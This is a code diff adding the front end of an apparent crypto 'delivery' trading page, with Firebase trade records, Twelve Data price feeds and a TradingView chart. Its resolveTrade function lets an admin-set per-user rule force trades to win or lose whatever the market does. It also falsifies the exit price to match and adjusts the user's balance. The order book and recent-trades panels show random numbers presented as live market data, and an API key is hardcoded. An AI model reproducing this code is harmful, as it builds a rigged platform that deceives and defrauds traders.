+                direction: currentTradeType === 'long' ? 'Long' : 'Short',
+                price: entryPriceStr,
+                amount: amountInput,
+                type: 'Delivery',
+                delivery_time: totalSeconds + 's',
+                status: 'Open',
+                user_uid: user.uid,
+                user_email: user.email || user.phoneNumber || 'User',
+                admin_outcome: inheritedRule,
+                timestamp: window.serverTimestamp()
+            };
+
+            let docId = null;
+            try {
+                const docRef = await window.addDoc(window.collection(window.db, 'trades'), tradeInfo);
+                docId = docRef.id;
+                activeTradeId = docId;
+            } catch (e) {
+                console.error("Error saving trade:", e);
+                alert("Trade failed");
+                return;
+            }
+
+            // Listen for admin changes during trade
+            const unsub = window.onSnapshot(window.doc(window.db, 'users', user.uid), (docSnap) => {
+                if (docSnap.exists()) {
+                    const data = docSnap.data();
+                    currentAdminOutcome = (data.delivery_rule && data.delivery_rule !== 'normal') ? data.delivery_rule : null;
+                }
+            });
+
+            // --- Add to Hold a position Table ---
+            const holdList = document.getElementById('hold-position-list');
+            const noOpen = document.getElementById('no-open-positions');
+            if (noOpen) noOpen.style.display = 'none';
+
+            const now = new Date();
+            const timeStr = now.toLocaleTimeString([], { hour12: false });
+
+            const holdRow = document.createElement('div');
+            holdRow.id = activeTradeId;
+            holdRow.className = "flex items-center px-4 py-2 text-xs text-[#eaecef] border-b border-[#2b3139] hover:bg-[#2b3139] transition-colors";
+            holdRow.innerHTML = `
+                <div class="w-16 font-bold text-white">${getDisplaySymbol(currentSymbol)}</div>
+                <div class="w-32">${timeStr}</div>
+                <div class="w-16 ${currentTradeType === 'long' ? 'text-[#0ecb81]' : 'text-[#f6465d]'} uppercase">${currentTradeType}</div>
+                <div class="w-24">${amountInput.toFixed(2)}</div>
+                <div class="w-20 text-[#848e9c]">0.5</div>
+                <div class="w-20">${totalSeconds}s</div>
+                <div class="w-24">${entryPrice.toFixed(4)}</div>
+                <div class="w-24 text-[#f0b90b]">--</div>
+                <div class="w-24 text-[#f0b90b]">--</div>
+                <div class="w-24 text-[#f0b90b]" id="expire-${activeTradeId}">${totalSeconds}s</div>
+                <div class="flex-1 text-right text-[#848e9c]">Pending</div>
+            `;
+            if (holdList) holdList.prepend(holdRow);
+
+            // Update Hold count
+            const holdCountEl = document.getElementById('hold-count');
+            if (holdCountEl) holdCountEl.textContent = '1';
+            // ------------------------------------
+
+            // Populate Modal
+            document.getElementById('modal-trade-type').textContent = currentTradeType.toUpperCase();
+            document.getElementById('modal-trade-type').className = currentTradeType === 'long' ? 'text-[#0ecb81]' : 'text-[#f6465d]';
+            document.getElementById('modal-asset').textContent = getDisplaySymbol(currentSymbol);
+            document.getElementById('modal-entry-price').textContent = entryPrice.toFixed(4);
+            document.getElementById('modal-current-price').textContent = entryPrice.toFixed(4);
+            document.getElementById('modal-amount').textContent = amountInput.toFixed(2) + ' USDT';
+
+            document.getElementById('modal-pnl').textContent = "Pending...";
+            document.getElementById('modal-pnl').className = "text-[#848e9c]";
+
+            // Reset UI states
+            document.getElementById('modal-result-alert').classList.add('hidden');
+            document.getElementById('modal-result-alert').className = "hidden px-4 py-3 text-center font-bold text-sm";
+            document.getElementById('modal-close-btn').classList.add('hidden');
+            document.getElementById('trade-modal').classList.remove('hidden');
+
+            // Start Countdown
+            let timeLeft = totalSeconds;
+            const timerEl = document.getElementById('modal-timer');
+            timerEl.textContent = timeLeft + 's';
+
+            if (activeTradeInterval) clearInterval(activeTradeInterval);
+
+            activeTradeInterval = setInterval(() => {
+                timeLeft--;
+                timerEl.textContent = timeLeft + 's';
+
+                // Update Row Countdown
+                const expireCell = document.getElementById('expire-' + activeTradeId);
+                if (expireCell) {
+                    expireCell.textContent = timeLeft + 's';
+                }
+
+                // Sync current price in modal with live price
+                const livePrice = parseFloat(document.getElementById('header-price').textContent);
+                document.getElementById('modal-current-price').textContent = livePrice.toFixed(4);
+
+                if (timeLeft <= 0) {
+                    clearInterval(activeTradeInterval);
+                    resolveTrade(currentTradeType, entryPrice, livePrice, amountInput, pnlPercentage, activeTradeId, timeStr, user.uid, unsub);
+                }
+            }, 1000);
+        }
+
+        async function resolveTrade(type, entryPrice, exitPrice, amount, pnlRatio, tradeId, startTimeStr, userId, unsub) {
+            if (unsub) unsub();
+
+            let isWin = false;
+            if (currentAdminOutcome === 'win') {
+                isWin = true;
+                if (type === 'long' && exitPrice <= entryPrice) exitPrice = entryPrice * 1.001;
+                if (type === 'short' && exitPrice >= entryPrice) exitPrice = entryPrice * 0.999;
+            } else if (currentAdminOutcome === 'loss') {
+                isWin = false;
+                if (type === 'long' && exitPrice >= entryPrice) exitPrice = entryPrice * 0.999;
+                if (type === 'short' && exitPrice <= entryPrice) exitPrice = entryPrice * 1.001;
+            } else {
+                if (type === 'long') {
+                    isWin = exitPrice > entryPrice;
+                } else {
+                    isWin = exitPrice < entryPrice;
+                }
+            }
+
+            const pnlAmount = isWin ? amount * pnlRatio : amount;
+            const balanceDelta = isWin ? pnlAmount : -amount;
+
+            const resultAlert = document.getElementById('modal-result-alert');
+            const pnlEl = document.getElementById('modal-pnl');
+
+            const livePriceEl = document.getElementById('modal-current-price');
+            livePriceEl.className = isWin ? 'text-[#0ecb81] font-bold' : 'text-[#f6465d] font-bold';
+
+            if (isWin) {
+                resultAlert.innerHTML = `TRADE WON!<br><span class="text-xs font-normal">Profit: +${pnlAmount.toFixed(2)} USDT</span>`;
+                resultAlert.className = "px-4 py-3 text-center font-bold text-sm bg-[#0ecb81]/20 text-[#0ecb81] border-y border-[#0ecb81]/30";
+                pnlEl.textContent = `+${pnlAmount.toFixed(2)} USDT`;
+                pnlEl.className = "text-[#0ecb81] font-bold";
+            } else {
+                resultAlert.innerHTML = `TRADE LOST!<br><span class="text-xs font-normal">Loss: -${pnlAmount.toFixed(2)} USDT</span>`;
+                resultAlert.className = "px-4 py-3 text-center font-bold text-sm bg-[#f6465d]/20 text-[#f6465d] border-y border-[#f6465d]/30";
+                pnlEl.textContent = `-${pnlAmount.toFixed(2)} USDT`;
+                pnlEl.className = "text-[#f6465d] font-bold";
+            }
+
+            // Update Firebase Trade Doc
+            if (window.updateDoc && window.doc) {
+                await window.updateDoc(window.doc(window.db, 'trades', tradeId), {
+                    status: isWin ? 'Win' : 'Lose',
+                    settlement_price: exitPrice.toFixed(4),
+                    pnl_amount: isWin ? pnlAmount.toFixed(2) : `-${pnlAmount.toFixed(2)}`
+                }).catch(e => console.error(e));
+
+                // Update User Balance
+                try {
+                    const userRef = window.doc(window.db, 'users', userId);
+                    const userSnap = await window.getDoc(userRef);
+                    if (userSnap.exists()) {
+                        const currentBalance = parseFloat(userSnap.data().balance || 0);
+                        const newBalance = currentBalance + balanceDelta;
+                        await window.updateDoc(userRef, { balance: newBalance });
+                    }
+                } catch (err) {
+                    console.error("Error updating balance:", err);
+                }
+            }
+
+            // --- Remove from Hold Table ---
+            const holdRow = document.getElementById(tradeId);
+            if (holdRow) holdRow.remove();
+
+            const holdList = document.getElementById('hold-position-list');
+            if (holdList && holdList.children.length === 1) { // Only the 'no-open' element remains
+                document.getElementById('no-open-positions').style.display = 'block';
+            }
+
+            const holdCountEl = document.getElementById('hold-count');
+            if (holdCountEl) holdCountEl.textContent = '0';
+
+            // --- Add to Historical Table ---
+            const historyList = document.getElementById('historical-position-list');
+            const noHistory = document.getElementById('no-historical-records');
+            if (noHistory) noHistory.style.display = 'none';
+
+            const now = new Date();
+            const timeStr = now.toLocaleTimeString([], { hour12: false });
+
+            const historyRow = document.createElement('div');
+            historyRow.className = "flex items-center px-4 py-2 text-xs text-[#eaecef] border-b border-[#2b3139] hover:bg-[#2b3139] transition-colors";
+            historyRow.innerHTML = `
+                <div class="w-16 font-bold text-white">${getDisplaySymbol(currentSymbol)}</div>
+                <div class="w-32">${startTimeStr}</div>
+                <div class="w-16 ${type === 'long' ? 'text-[#0ecb81]' : 'text-[#f6465d]'} uppercase">${type}</div>
+                <div class="w-24">${amount.toFixed(2)}</div>
+                <div class="w-24">${entryPrice.toFixed(4)}</div>
+                <div class="w-24 ${isWin ? 'text-[#0ecb81]' : 'text-[#f6465d]'}">${exitPrice.toFixed(4)}</div>
+                <div class="w-24 ${isWin ? 'text-[#0ecb81]' : 'text-[#f6465d]'}">${isWin ? '+' : '-'}${pnlAmount.toFixed(2)}</div>
+                <div class="w-32">${timeStr}</div>
+                <div class="flex-1 text-right font-bold ${isWin ? 'text-[#0ecb81]' : 'text-[#f6465d]'}">${isWin ? 'Win' : 'Loss'}</div>
+            `;
+            if (historyList) historyList.prepend(historyRow);
+            // -------------------------------
+
+            // Show close button
+            document.getElementById('modal-close-btn').classList.remove('hidden');
+        }
+
+        function closeTradeModal() {
+            document.getElementById('trade-modal').classList.add('hidden');
+        }
+
+    </script>
+    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+    <script>
+        const API_KEY = 'f5a558c730a64406839742e38b78af5e';
+        let currentSymbol = 'BTC/USDT';
+        let currentInterval = '15min'; // Local timeframe tracking
+        let ws = null;
+        let tvWidget = null;
+        let currentCandle = null;
+        let lastPriceUpdate = Date.now();
+
+        // Configuration for Coin Pairs
+        const coinPairs = [
+            'BTC/USDT', 'ETH/USDT', 'HBAR/USDT', 'XMR/USDT',
+            'ALGO/USDT', 'ADA/USDT', 'DOT/USDT', 'NEO/USDT', 'IOTA/USDT', 'XTZ/USDT',
+            'ETC/USDT', 'XRP/USDT', 'AXS/USDT', 'SAND/USDT', 'LTC/USDT', 'MANA/USDT',
+            'USDC/USDT', 'SOL/USDT', 'LINK/USDT', 'CHZ/USDT', 'AVAX/USDT', 'BCH/USDT',
+            'BNB/USDT', 'DOGE/USDT', 'HYPE/USDT', 'SUI/USDT', 'TON/USDT', 'TRX/USDT',
+            'XLM/USDT', 'ICP/USDT', 'VET/USDT', 'YFI/USDT'
+        ];
+
+        // Twelve Data normalization: Use /USD for API but show /USDT in UI
+        function getApiSymbol(pair) {
+            if (!pair) return pair;
+            return pair.replace('/USDT', '/USD');
+        }
+
+        function getDisplaySymbol(apiSymbol) {
+            if (!apiSymbol) return apiSymbol;
+            // Map USD back to USDT for all coins, but keep BTC/USD if that's how it's received
+            // This ensures safeSymbol matching works (coin-BTC-USDT)
+            return apiSymbol.includes('/USD') ? apiSymbol.replace('/USD', '/USDT') : apiSymbol;
+        }
+
+        const updateHeader = (data) => {
+            const apiSymbol = getApiSymbol(currentSymbol);
+            if (data.symbol !== apiSymbol && data.symbol !== currentSymbol) return;
+
+            const priceEl = document.getElementById('header-price');
+            const changeEl = document.getElementById('header-change');
+
+            if (priceEl && data.price) {
+                const prevPrice = parseFloat(priceEl.textContent);
+                const currentPrice = parseFloat(data.price);
+                priceEl.textContent = currentPrice.toFixed(currentPrice < 1 ? 4 : 2);
+                priceEl.className = `text-lg font-bold ${currentPrice >= prevPrice ? 'text-up' : 'text-down'}`;
+
+                // Update Order Book and Market Trades simulation
+                generateOrderBook(currentPrice);
+                generateMarketTrade(currentPrice, currentPrice >= prevPrice);
+            }
+        };
+
+        // Market Data Simulation functions
+        const generateOrderBook = (price) => {
+            const asksContainer = document.getElementById('orderbook-asks-container');
+            const bidsContainer = document.getElementById('orderbook-bids-container');
+            const currentPriceEl = document.getElementById('orderbook-current-price');
+            const currentUsdEl = document.getElementById('orderbook-current-usd');
+
+            if (!asksContainer || !bidsContainer || !currentPriceEl) return;
+
+            // Update center price
+            const decimals = price < 1 ? 4 : 2;
+            currentPriceEl.textContent = price.toFixed(decimals);
+            currentUsdEl.textContent = '$' + price.toFixed(decimals);
+
+            // Calculate tick size based on price magnitude
+            const tickSize = price > 1000 ? 0.1 : (price > 1 ? 0.01 : 0.0001);
+            const amountMultiplier = price > 1000 ? 0.5 : (price > 10 ? 10 : 500);
+
+            // Generate Asks (Red - Higher than current price)
+            let asksHtml = '';
+            let currentAskPrice = price + (tickSize * 7); // Start from highest
+            for (let i = 0; i < 7; i++) {
+                const p = currentAskPrice.toFixed(decimals);
+                const amt = (Math.random() * amountMultiplier + 0.01).toFixed(3);
+                const total = (parseFloat(p) * parseFloat(amt)).toFixed(2);
+                asksHtml += `<div class="order-row text-down mb-0.5 hover:bg-[#2b3139] cursor-pointer"><span>${p}</span><span class="text-right">${amt}</span><span class="text-right">${total}</span></div>`;
+                currentAskPrice -= tickSize;
+            }
+            asksContainer.innerHTML = asksHtml;
+
+            // Generate Bids (Green - Lower than current price)
+            let bidsHtml = '';
+            let currentBidPrice = price - tickSize; // Start from highest bid
+            for (let i = 0; i < 7; i++) {
+                const p = currentBidPrice.toFixed(decimals);
+                const amt = (Math.random() * amountMultiplier + 0.01).toFixed(3);
+                const total = (parseFloat(p) * parseFloat(amt)).toFixed(2);
+                bidsHtml += `<div class="order-row text-up mb-0.5 hover:bg-[#2b3139] cursor-pointer"><span>${p}</span><span class="text-right">${amt}</span><span class="text-right">${total}</span></div>`;
+                currentBidPrice -= tickSize;
+            }
+            bidsContainer.innerHTML = bidsHtml;
+        };
+
+        let marketTrades = [];
+        const generateMarketTrade = (price, isUp) => {
+            const container = document.getElementById('market-trades-container');
+            if (!container) return;
+
+            const decimals = price < 1 ? 4 : 2;
+            const amountMultiplier = price > 1000 ? 0.3 : (price > 10 ? 5 : 200);
+
+            const now = new Date();
+            const timeStr = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
+
+            const newTrade = {
+                price: price.toFixed(decimals),
+                amount: (Math.random() * amountMultiplier).toFixed(4),
+                time: timeStr,
+                isUp: isUp
+            };
+
+            marketTrades.unshift(newTrade);
+
+            // Pre-fill history if it was just reset
+            if (marketTrades.length === 1) {
+                let pastPrice = price;
+                let pastTime = new Date(now.getTime());
+                for (let i = 0; i < 19; i++) {
+                    pastTime = new Date(pastTime.getTime() - (Math.random() * 3000 + 1000));
+                    let pastTimeStr = `${pastTime.getHours().toString().padStart(2, '0')}:${pastTime.getMinutes().toString().padStart(2, '0')}:${pastTime.getSeconds().toString().padStart(2, '0')}`;
+                    let isUpPast = Math.random() > 0.5;
+                    let tick = price > 1000 ? 0.2 : (price > 1 ? 0.05 : 0.001);
+                    pastPrice = isUpPast ? pastPrice - tick : pastPrice + tick;
+                    marketTrades.push({
+                        price: pastPrice.toFixed(decimals),
+                        amount: (Math.random() * amountMultiplier).toFixed(4),
+                        time: pastTimeStr,
+                        isUp: isUpPast
+                    });
+                }
+            }
+
+            if (marketTrades.length > 20) marketTrades.pop(); // Keep only last 20 trades
+
+            let html = '';
+            for (const t of marketTrades) {
+                const colorClass = t.isUp ? 'text-up' : 'text-down';
+                html += `<div class="order-row ${colorClass} mb-0.5 hover:bg-[#2b3139] cursor-pointer"><span>${t.price}</span><span class="text-right text-[#eaecef]">${t.amount}</span><span class="text-right text-[#848e9c]">${t.time}</span></div>`;
+            }
+
+            container.innerHTML = html;
+        };
+
+        const formatCompactNumber = (value) => {
+            const num = parseFloat(value);
+            if (!isFinite(num) || num <= 0) return '--';
+            if (num >= 1000000000) return (num / 1000000000).toFixed(2) + 'B';
+            if (num >= 1000000) return (num / 1000000).toFixed(2) + 'M';
+            if (num >= 1000) return (num / 1000).toFixed(2) + 'K';
+            return num.toFixed(2);
+        };
+
+        const parseVolume = (data) => {
+            if (!data) return 0;
+            const raw = data.rolling_24h_volume || data.day_volume || data.volume || 0;
+            const val = parseFloat(raw);
+            return isFinite(val) ? val : 0;
+        };
+
+        const updateCoinRow = (data) => {
+            const apiSymbol = data.symbol;
+            const displaySymbol = getDisplaySymbol(apiSymbol);
+
+            // Try matching by coin-BTC-USDT or coin-BTC-USD
+            const safeDisplay = displaySymbol.replace('/', '-');
+            const safeApi = apiSymbol.replace('/', '-');
+
+            const row = document.getElementById(`coin-${safeDisplay}`) || document.getElementById(`coin-${safeApi}`);
+
+            if (row) {
+                const priceCell = row.querySelector('.price-cell');
+                const changeCell = row.querySelector('.change-cell');
+                const volumeCell = row.querySelector('.volume-cell');
+                const priceVal = data.price || data.close;
+
+                if (priceCell && priceVal) {
+                    const price = parseFloat(priceVal);
+                    if (price > 0) priceCell.textContent = price.toFixed(price < 1 ? 4 : 2);
+                }
+
+                if (changeCell && data.percent_change !== undefined) {
+                    const change = parseFloat(data.percent_change);
+                    changeCell.textContent = change.toFixed(2) + '%';
+                    changeCell.className = `text-right change-cell ${change >= 0 ? 'text-up' : 'text-down'}`;
+                }
+
+                if (volumeCell) {
+                    volumeCell.textContent = formatCompactNumber(parseVolume(data));
+                }
+            }
+        };
+
+        // Fetch All Quotes for Drawer to initialize missing prices
+        async function fetchAllQuotes() {
+            const apiSymbols = coinPairs.map(p => getApiSymbol(p));
+            try {
+                const res = await fetch(`https://api.twelvedata.com/quote?symbol=${apiSymbols.join(',')}&apikey=${API_KEY}`);
+                const data = await res.json();
+
+                if (data.status === 'error') return;
+
+                for (const key in data) {
+                    if (data[key] && data[key].symbol) {
+                        updateCoinRow(data[key]);
+
+                        // Ensure current symbol updates if WebSocket is slow
+                        const apiSym = getApiSymbol(currentSymbol);
+                        if (data[key].symbol === currentSymbol || data[key].symbol === apiSym) {
+                            updateHeader(data[key]);
+                        }
+                    }
+                }
+            } catch (err) {
+                console.error('Error fetching bulk quotes:', err);
+            }
+        }
+
+        // Fetch Quote Details (24h high/low etc)
+        async function fetchQuote(symbol) {
+            const apiSymbol = getApiSymbol(symbol);
+            try {
+                const res = await fetch(`https://api.twelvedata.com/quote?symbol=${apiSymbol}&apikey=${API_KEY}`);
+                const data = await res.json();
+                if (data.status === 'error') return;
+
+                document.getElementById('header-low').textContent = parseFloat(data.low || 0).toFixed(2);
+                document.getElementById('header-high').textContent = parseFloat(data.high || 0).toFixed(2);
+                const volume = parseVolume(data);
+                const close = parseFloat(data.close || data.price || 0);
+                const turnover = close > 0 && volume > 0 ? close * volume : 0;
+                document.getElementById('header-total').textContent = turnover > 0 ? formatCompactNumber(turnover) : '0.00';
+                document.getElementById('header-amount').textContent = volume > 0 ? formatCompactNumber(volume) : '0.00';
+
+                const change = parseFloat(data.percent_change || 0);
+                const price = parseFloat(data.price || data.close || 0);
+
+                const priceEl = document.getElementById('header-price');
+                const changeEl = document.getElementById('header-change');
+
+                if (priceEl && price > 0) {
+                    const prevPrice = parseFloat(priceEl.textContent) || price;
+                    priceEl.textContent = price.toFixed(price < 1 ? 4 : 2);
+                    priceEl.className = `text-lg font-bold ${price >= prevPrice ? 'text-up' : 'text-down'}`;
+
+                    generateOrderBook(price);
+                    generateMarketTrade(price, change >= 0);
+                }
+
+                if (changeEl) {
+                    changeEl.textContent = (change >= 0 ? '+' : '') + change.toFixed(2) + '%';
+                    changeEl.className = `text-xs ${change >= 0 ? 'text-up' : 'text-down'}`;
+                }
+
+                // Also update price cell in drawer if exists
+                const safeSymbol = symbol.replace('/', '-');
+                const row = document.getElementById(`coin-${safeSymbol}`);
+                if (row) {
+                    if (price > 0) row.querySelector('.price-cell').textContent = price.toFixed(price < 1 ? 4 : 2);
+                    row.querySelector('.change-cell').textContent = change.toFixed(2) + '%';
+                    row.querySelector('.change-cell').className = `text-right change-cell ${change >= 0 ? 'text-up' : 'text-down'}`;
+                }
+            } catch (err) {
+                console.error('Error fetching quote:', err);
+            }
+        }
+
+
+
+        // WebSocket initialization
+        function initWebSocket() {
+            if (ws) ws.close();
+
+            console.log('Connecting to Twelve Data WebSocket...');
+            ws = new WebSocket(`wss://ws.twelvedata.com/v1/quotes/price?apikey=${API_KEY}`);
+
+            ws.onopen = () => {
+                console.log('Twelve Data WebSocket Connected');
+                const apiSymbols = coinPairs.map(p => getApiSymbol(p));
+                ws.send(JSON.stringify({
+                    action: 'subscribe',
+                    params: { symbols: apiSymbols.join(',') }
+                }));
+            };
+
+            ws.onmessage = (event) => {
+                const data = JSON.parse(event.data);
+
+                // Keep-alive or heartbeats
+                if (data.event === 'heartbeat') {
+                    ws.send(JSON.stringify({ action: 'heartbeat' }));
+                    return;
+                }
+
+                if (data.event === 'price') {
+                    lastPriceUpdate = Date.now();
+                    updateHeader(data);
+                    updateCoinRow(data);
+                }
+            };
+
+            ws.onclose = (e) => {
+                console.warn('WebSocket closed:', e.reason);
+                setTimeout(initWebSocket, 5000);
+            };
+
+            ws.onerror = (err) => {
+                console.error('WebSocket Error:', err);
+            };
+        }
+
+        // Fallback: poll quotes manually to make sure all coins are updated!
+        // This acts as a robust fail-safe if the TwelveData websockets drop or ignore symbols.
+        setInterval(() => {
+            fetchAllQuotes();
+            if (Date.now() - lastPriceUpdate > 10000) {
+                fetchQuote(currentSymbol);
+            }
+        }, 10000); // 10-second fallback polling target
+
+        // Populate Coin List in Drawer
+        function populateCoins(query = '') {
+            const coinListContainer = document.getElementById('drawer-coin-list');
+            if (!coinListContainer) return;
+
+            const filteredPairs = coinPairs.filter(pair =>
+                pair.toLowerCase().includes(query.toLowerCase())
+            );
+
+            coinListContainer.innerHTML = filteredPairs.map(pair => `
+                <div class="coin-row market-list-row border-b border-[#2b3139]/50 cursor-pointer hover:bg-[#2b3139]" 
+                     data-pair="${pair}" id="coin-${pair.replace('/', '-')}">
+                    <div class="flex items-center gap-2 pointer-events-none">
+                        <svg class="text-[#848e9c]" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+                        <span class="font-medium text-[#eaecef]">${pair}</span>
+                    </div>
+                    <div class="text-right text-[#eaecef] price-cell pointer-events-none">0.00</div>
+                    <div class="text-right change-cell text-down pointer-events-none">0.00%</div>
+                    <div class="text-right volume-cell text-[#848e9c] pointer-events-none">--</div>
+                </div>
+            `).join('');
+
+            document.querySelectorAll('.coin-row').forEach(row => {
+                row.addEventListener('click', () => {
+                    const newPair = row.getAttribute('data-pair');
+                    switchSymbol(newPair);
+
+                    // Close drawer
+                    const marketDrawer = document.getElementById('market-drawer');
+                    const drawerOverlay = document.getElementById('drawer-overlay');
+                    if (marketDrawer) marketDrawer.classList.remove('open');
+                    if (drawerOverlay) {
+                        drawerOverlay.classList.remove('active');
+                        drawerOverlay.style.display = 'none';
+                    }
+                });
+            });
+        }
+
+        async function switchSymbol(symbol) {
+            if (!symbol || symbol === currentSymbol) return;
+
+            // Update State
+            currentSymbol = symbol;
+            document.getElementById('selected-pair').textContent = symbol;
+            const legendPair = document.getElementById('legend-pair-full'); // Changed ID
+            if (legendPair) legendPair.textContent = symbol; // Update legend-pair-full
+            document.title = `${symbol} - Trading`;
+
+            // Update Loading UI
+            const loading = document.getElementById('chart-loading');
+            if (loading) loading.style.display = 'flex';
+
+            // Fetch Real Data
+            fetchQuote(symbol);
+            initTradingView(symbol, currentInterval);
+        }
+
+        function initTradingView(symbol, interval) {
+            const containerId = 'chart-container';
+            const cleanSymbol = symbol.replace('/', '').toUpperCase();
+
+            const intervalMap = {
+                '1min': '1', '5min': '5', '15min': '15', '30min': '30',
+                '1h': '60', '4h': '240', '1day': 'D', '1week': 'W', '1month': 'M'
+            };
+
+            const tvInterval = intervalMap[interval] || '15';
+
+            // Hide manual legend and indicators as TradingView has its own
+            const legend = document.getElementById('chart-legend');
+            if (legend) legend.style.display = 'none';
+            const indicators = document.querySelector('.h-8.border-t');
+            if (indicators) indicators.style.display = 'none';
+
+            new TradingView.widget({
+                "width": "100%",
+                "height": "100%",
+                "symbol": `BINANCE:${cleanSymbol}`,
+                "interval": tvInterval,
+                "timezone": "Etc/UTC",
+                "theme": "dark",
+                "style": "1",
+                "locale": "en",
+                "toolbar_bg": "#131722",
+                "enable_publishing": false,
+                "withdateranges": true,
+                "hide_side_toolbar": false,
+                "allow_symbol_change": true,
+                "container_id": containerId,
+                "backgroundColor": "#131415",
+                "gridColor": "rgba(43, 49, 57, 0.4)",
+                "save_image": false,
+            });
+        }
+
+        // Initialize Everything
+        document.addEventListener('DOMContentLoaded', () => {
+            // 1. Setup Event Listeners First
+            const hamburgerBtn = document.getElementById('hamburger-btn');
+            const marketDrawer = document.getElementById('market-drawer');
+            const drawerOverlay = document.getElementById('drawer-overlay');
+            const searchInput = document.getElementById('coin-search');
+
+            if (hamburgerBtn) {
+                hamburgerBtn.addEventListener('click', (e) => {
+                    e.stopPropagation();
+                    marketDrawer.classList.add('open');
+                    drawerOverlay.classList.add('active');
+                    drawerOverlay.style.display = 'block';
+                });
+            }
+
+            if (drawerOverlay) {
+                drawerOverlay.addEventListener('click', () => {
+                    marketDrawer.classList.remove('open');
+                    drawerOverlay.classList.remove('active');
+                    drawerOverlay.style.display = 'none';
+                });
+            }
+
+            if (searchInput) {
+                searchInput.addEventListener('input', (e) => populateCoins(e.target.value));
+            }
+
+            // 2. Chart setup using TradingView Widget
+            initTradingView(currentSymbol, currentInterval);
+
+            // Setup Timeframe Selectors
+            const timeframeButtons = document.querySelectorAll('#timeframe-selector span[data-interval]');
+            timeframeButtons.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const newInterval = btn.getAttribute('data-interval');
+                    // Update active UI state
+                    timeframeButtons.forEach(b => b.classList.remove('font-bold', 'text-[#eaecef]', 'active-time'));
+                    btn.classList.add('font-bold', 'text-[#eaecef]', 'active-time');
+
+                    currentInterval = newInterval;
+                    initTradingView(currentSymbol, currentInterval);
+                });
+            });
+
+            // 3. Data Initialization
+            try {
+                populateCoins();
+                fetchAllQuotes();
+                setTimeout(() => {
+                    switchSymbol(currentSymbol);
+                    initWebSocket();
+                }, 500);
+            } catch (err) {
+                console.error('Error during data initialization:', err);
+            }
+        });
+    </script>
+    <script src="/js/site-language.js"></script>
+</body>
+
+</html>
+```
+
+
+
+
+
+
